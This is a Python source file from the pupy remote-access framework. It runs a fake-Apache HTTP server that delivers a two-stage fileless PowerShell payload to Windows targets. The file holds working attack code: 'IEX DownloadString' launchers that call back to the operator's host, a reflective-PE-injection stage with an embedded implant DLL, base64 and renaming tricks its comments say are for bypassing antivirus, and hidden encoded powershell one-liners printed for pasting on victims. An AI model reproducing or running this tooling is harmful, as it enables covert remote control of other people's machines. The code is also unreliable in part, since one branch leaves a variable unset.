#!/usr/bin/env python
# -*- coding: utf-8 -*-
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SocketServer import ThreadingMixIn
import os.path
from pupylib.utils.term import colorize
import random, string
from pupygen import generate_binary_from_template
from pupylib.PupyConfig import PupyConfig
from ssl import wrap_socket
from base64 import b64encode
import re
from pupylib.PupyCredentials import Credentials
import tempfile
import ssl

from modules.lib.windows.powershell import obfuscatePowershellScript, obfs_ps_script

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

# "url_random_one" and "url_random_two_x*" variables are fixed because if you break you ps1_listener listener, the ps1_listener payload will not be able to get stages -:(
url_random_one = "index.html"
url_random_two_x86 = "voila.html"
url_random_two_x64 = "tata.html"

APACHE_DEFAULT_404="""<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>"""

def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf, isX64):
    '''
    Return source code of InvokeReflectivePEInjection.ps1 script with pupy dll embedded
    Ready for executing
    '''
    SPLIT_SIZE = 100000
    initCode, concatCode = "", ""
    arch = None
    code = """
    $PEBytes = ""
    {0}
    $PEBytesTotal = [System.Convert]::FromBase64String({1})
    Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
    """#{1}=x86dll or x64dll
    if isX64 == True:
        print colorize("[+] ","green")+"x64 dll is loaded in InvokeReflectivePEInjection script..."
        targetArch = "x64"
    else:
        print colorize("[+] ","green")+"x86 dll is loaded in InvokeReflectivePEInjection script..."
        targetArch = "x86"
    binaryDll=b64encode(generate_binary_from_template(payload_conf, 'windows', arch=targetArch, shared=True)[0])
    binaryDllparts = [binaryDll[i:i+SPLIT_SIZE] for i in range(0, len(binaryDll), SPLIT_SIZE)]
    for i,aPart in enumerate(binaryDllparts):
        initCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
        concatCode += "$PEBytes{0}+".format(i)
    print(colorize("[+] ","green")+"{0} variables generated for dll".format(i+1))
    script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
    return obfs_ps_script("{0}\n{1}".format(script, code.format(initCode, concatCode[:-1])))

class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.server_version = "Apache/2.4.27 (Unix)"
        self.sys_version = ""
        # print self.server.random_reflectivepeinj_name
        if self.path=="/%s" % url_random_one:
            targetIsX64 = None
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            ps_template_stage1 = """
            if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
            {{
            {0}
            }}
            else
            {{
            {1}
            }}
            """
            if self.server.useTargetProxy == True:
                print colorize("[+] ","green")+"Stage 1 configured for using target's proxy configuration"
                if not self.server.sslEnabled:
                    print colorize("[+] ","green")+"Stage 1 configured for NOT using SSL"
                    launcher_x86 = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip, self.server.link_port, url_random_two_x86)
                    launcher_x64 = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip, self.server.link_port, url_random_two_x64)
                else:
                    print colorize("[+] ","green")+"Stage 1 configured for using SSL"
                    launcher_x86 = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip, self.server.link_port, url_random_two_x86)
                    launcher_x64 = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip, self.server.link_port, url_random_two_x64)
            else:
                print colorize("[+] ","green")+"Stage 1 configured for NOT using target's proxy configuration"
                if not self.server.sslEnabled:
                    print colorize("[+] ","green")+"Stage 1 configured for NOT using SSL"
                    launcher_x86 = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two_x86)
                    launcher_x64 = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two_x64)
                else:
                    print colorize("[+] ","green")+"Stage 1 configured for using SSL"
                    launcher_x86 = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two_x86)
                    launcher_x64 = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two_x64)
            stage1 = ps_template_stage1.format(launcher_x64, launcher_x86)
            # For bypassing AV
            stage1 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage1))
            # Send stage 1 to target
            self.wfile.write(stage1)
            print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"

        elif self.path=="/%s" % url_random_two_x86 or self.path=="/%s" % url_random_two_x64:
            self.send_response(200)
            #self.send_header('Content-type','application/octet-stream')
            self.send_header('Content-type','text/html')
            self.end_headers()
            code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
            code=code.replace("Invoke-ReflectivePEInjection", self.server.random_reflectivepeinj_name) # seems to bypass some av like avast :o)
            if self.path=="/%s" % url_random_two_x86: 
                print colorize("[+] ","green")+"remote script is running in a x86 powershell process"
                targetIsX64 = False
            else:
                print colorize("[+] ","green")+"remote script is running in a x64 powershell process"
                targetIsX64 = True
            stage2 = getInvokeReflectivePEInjectionWithDLLEmbedded(self.server.payload_conf, isX64=targetIsX64)
            stage2 = stage2.replace("Invoke-ReflectivePEInjection",''.join(random.choice(string.ascii_uppercase) for _ in range(20)))
            # For bypassing AV
            stage2 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2))
            # Send stage 2 to target
            self.wfile.write(stage2)
            print colorize("[+] ","green")+"[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!"
            print colorize("[+] ","green")+colorize("%s:You should have a pupy shell in few seconds from this host..."%self.client_address[0],"green")

        else:
            self.send_response(404)
            self.send_header('Content-type','text/html')
            self.end_headers()
            self.wfile.write(APACHE_DEFAULT_404)

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    def set(self,conf, link_ip, port, sslEnabled, useTargetProxy,nothidden):
        self.payload_conf = conf
        self.link_ip=link_ip
        self.link_port=port
        self.random_reflectivepeinj_name=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,random.randint(8,12))])
        self.useTargetProxy = useTargetProxy
        self.sslEnabled=sslEnabled
        self.nothidden=nothidden
        if self.sslEnabled:
            credentials = Credentials()
            keystr = credentials['SSL_BIND_KEY']
            certstr = credentials['SSL_BIND_CERT']

            fd_cert_path, tmp_cert_path = tempfile.mkstemp()
            fd_key_path, tmp_key_path = tempfile.mkstemp()

            os.write(fd_cert_path, certstr)
            os.close(fd_cert_path)
            os.write(fd_key_path, keystr)
            os.close(fd_key_path)

            self.socket = wrap_socket (self.socket, certfile=tmp_cert_path, keyfile=tmp_key_path, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
            self.tmp_cert_path=tmp_cert_path
            self.tmp_key_path=tmp_key_path

    def server_close(self):
        try:
            os.unlink(self.tmp_cert_path)
            os.unlink(self.tmp_key_path)
        except:
            pass
        self.socket.close()

def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True, nothidden=False):
    try:
        try:
            server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
            server.set(conf, link_ip, port, sslEnabled, useTargetProxy, nothidden)
        except Exception as e:
            # [Errno 98] Adress already in use
            raise

        print colorize("[+] ","green")+"copy/paste one of these one-line loader to deploy pupy without writing on the disk :"
        print " --- "
        if useTargetProxy == True:
            if not sslEnabled:
                a="iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')"%(link_ip, port, url_random_one)
                b=b64encode(a.encode('UTF-16LE'))
            else:
                a="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object System.Net.WebClient).DownloadString('https://%s:%s/%s')"%(link_ip, port, url_random_one)
                b=b64encode(a.encode('UTF-16LE'))
            if nothidden==True:
                oneliner=colorize("powershell.exe -noni -nop -enc %s"%b, "green")
            else:
                oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
            message=colorize("Please note that if the target's system uses a proxy, this previous powershell command will download/execute pupy through the proxy", "yellow")
        else:
            if not sslEnabled:
                a="$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')"%(link_ip, port, url_random_one)
                b=b64encode(a.encode('UTF-16LE'))
            else:
                a="$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object System.Net.WebClient).DownloadString('https://%s:%s/%s')"%(link_ip, port, url_random_one)
                b=b64encode(a.encode('UTF-16LE'))
                if nothidden==True:
                    oneliner=colorize("powershell.exe -noni -nop -enc %s"%b, "green")
                else:
                    oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
            message= colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
        if nothidden==True:
            print colorize("powershell.exe -noni -nop -c \"%s\""%a, "green")
        else:
            print colorize("powershell.exe -w hidden -noni -nop -c \"%s\""%a, "green")
        print " --- "
        print oneliner
        print " --- "
        print message
        print " --- "

        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
        print colorize("[+] ","green")+'waiting for a connection ...'
        server.serve_forever()
    except KeyboardInterrupt:
        print 'KeyboardInterrupt received, shutting down the web server'
        server.server_close()
        exit()
